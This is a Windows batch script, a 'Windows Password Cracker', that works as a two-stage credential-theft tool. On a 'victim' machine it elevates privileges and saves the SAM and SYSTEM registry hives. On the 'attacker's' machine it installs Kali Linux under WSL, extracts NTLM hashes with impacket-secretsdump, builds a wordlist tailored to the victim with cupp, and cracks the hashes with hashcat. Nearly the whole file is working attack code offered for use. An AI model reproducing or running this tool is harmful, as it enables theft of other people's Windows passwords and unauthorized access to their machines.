@echo off
fltmc >nul 2>&1 || (
    PowerShell Start -Verb RunAs '%0' 2> nul || (
        >nul pause && exit 1
    )
    exit 0
)
cd %~dp0
if exist hash.txt del hash.txt
for /f "tokens=4-7 delims=[.] " %%i in ('ver') do @(if "%%i"=="Version" (set windowsver=%%j) else (set windowsver=%%i))
FOR /F "tokens=* delims=" %%x in ('call ini.bat /i coloring /s TerminalTextColoring config\settings.ini') do (set coloring=%%x &  echo %RESET%[%BRIGHT_YELLOW%~%RESET%] Checking for text coloring..)
if %WINDOWSVER% GEQ 10 if "%coloring%"=="true " call config\tc.bat
if %WINDOWSVER% GEQ 10 if "%coloring%"=="true " echo %RESET%[%BRIGHT_GREEN%+%RESET%] Windows version is 10+, enabling text coloring.. 
cls
title Windows Password Cracker ~ WSL
call logo.bat
echo.
echo %BRIGHT_BLUE%Windows%RESET% Password Cracker
echo =========================
set /p mode=Select a mode ([%BRIGHT_RED%V%RESET%]ictim Machine/[%BRIGHT_GREEN%A%RESET%]ttacker's Machine) ^> 
if /i "%mode%"=="V" (
	echo.
	if exist sam.save del sam.save
	if exist system.save del system.save
	echo Saving SAM and System..
	reg save HKLM\sam sam.save >nul
	reg save HKLM\system system.save >nul
	echo.
	pause
	exit
)
if /i "%mode%"=="A" (
	echo.
	set /p samf="Enter the %BRIGHT_BLUE%SAM%RESET% file's name (WITH EXTENSION) > "
	set /p sysf="Enter the %BRIGHT_BLUE%SYSTEM%RESET% file's name (WITH EXTENSION) > "
)
if /i "%mode%"=="A" (
	echo.
	echo This process %BRIGHT_RED%REQUIRES%RESET% WSL! By continuing, you %BRIGHT_GREEN%agree%RESET% to automatic installation of it.
	pause
	if exist pass.txt call :clearpass
	if exist pass.txt if /i "%cp%"=="P" call :clearpass
	echo.
	echo Installing WSL..
	wsl --install -d kali-linux -n
	echo.
	echo Getting APT updates..
	wsl -u root -e sudo apt-get update
	echo.
	echo Getting packages..
	wsl -u root -e sudo apt-get install python3-impacket
	wsl -u root -e sudo apt-get install cupp
	wsl -u root -e sudo apt-get install hashcat
	echo.
	wsl -u root -e impacket-secretsdump -system %sysf% -sam %samf% LOCAL
	echo.
	echo Find the user whose password you want and copy the last part of its hash, which is the last part that starts with ":")
	echo Copy only the part, not the ":" or the ":::"
	echo.
	echo For example, a hash might look like this:
	echo %BRIGHT_BLUE%Administrator%RESET%:500:aad3b435b51404eeaad3b435b51404ee:%BRIGHT_YELLOW%8846f7eaee8fb117ad06bdd830b7586c%RESET%:::
	echo.
	echo You would need to copy:
	echo %BRIGHT_YELLOW%8846f7eaee8fb117ad06bdd830b7586c%RESET%
	set /p part=Paste it here ^> 
	echo %part%>>hash.txt
	echo.
	echo Do you have a passlist %BRIGHT_GREEN%already%RESET% or would you like to create a %BRIGHT_BLUE%personalized%RESET% (to the victim) one?
	echo If you don't want a personalized passlist, a good default one is rockyou.txt.
	set /p pl=([%BRIGHT_GREEN%P%RESET%]ersonalized/[%BRIGHT_YELLOW%H%RESET%]ave Already) ^> 
	echo.
	if /i "%pl%"=="P" echo Enter as much information as you know! & wsl -u root -e cupp -i
	set /p name=Enter passlist filename (WITH EXTENSION) ^> 
	wsl -u root -e hashcat -m 1000 hash.txt %name%
	timeout /t 5 /NOBREAK >NUL
	cls
	echo If any passwords were found, they will show up here.
	echo Syntax: ^<hash^>:^<password^>
	wsl -u root -e hashcat -m 1000 hash.txt %name% --show
	wsl -u root -e hashcat -m 1000 hash.txt %name% --show >> pass.txt
	echo ^^ %name%>>pass.txt
	pause
	del sam.save
	del system.save
	del %name%
	exit
)

:clearpass
echo.
echo Do you want to clear %BRIGHT_RED%pass.txt%RESET%?
set /p cp=([%BRIGHT_BLUE%P%RESET%]rint/[%BRIGHT_GREEN%Y%RESET%]es/[%BRIGHT_RED%N%RESET%]o) ^> 
echo.
if /i "%cp%"=="P" type pass.txt
if /i "%cp%"=="Y" del pass.txt
goto :EOF